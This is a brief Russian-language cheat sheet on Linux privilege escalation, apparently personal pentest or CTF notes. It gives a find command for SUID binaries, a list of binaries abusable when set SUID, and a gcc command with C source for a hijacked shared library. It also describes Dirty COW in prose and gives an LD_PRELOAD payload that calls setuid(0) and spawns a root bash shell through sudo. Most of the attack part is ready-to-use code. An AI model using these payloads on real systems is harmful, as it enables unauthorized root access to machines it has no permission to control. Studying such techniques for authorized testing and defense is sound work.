## SUID/SGID
Если у файла есть SUID бит, то он всегда запускается с разрешениями root

Поиск таких файлов:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Имея SUID бит на этих бинарях можно повысить привилегии:
`Cat`, `Bash`, `cp`, `find`, `echo`, `[[NMAP]]`, `Nano`, `Vim`

## Missing libraries
При запуске различных бинарей могут быть ошибки в библиотеках, тогда следует с ними разобраться

Здесь мы находим инфо о подгружаемых библиотеках:
```bash
ld.so.conf.d
```

Созданный c-файл компилируем:
```bash
gcc -shared -o libwelcome.so -fPIC libwelcome.c
```

Скрипт для root на C:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
 
int welcome(){
        setuid(0);
        setgid(0);
        system("/bin/bash");
}
```

## Dirty COW (Race Condition)

Dirty COW — ошибка в механизме copy-on-write (COW) в Linux-ядре. Она позволяет непривилегированному пользователю изменить содержимое файлов, доступных только для чтения (например, системные файлы типа `/etc/passwd`) путём эксплуатации гонки при работе с отображением файла в память (mmap) и специфическими вызовами, которые ядро обрабатывает неправильно.

## Process injection

Позволяет внедрить эксплойт в адресное пространство другого процесса.
Для этого нужен `sudo` приложение, использующее переменную _LD_PRELOAD_.

Компилируем и запускаем данный файл и получаем `root`.

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
 
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
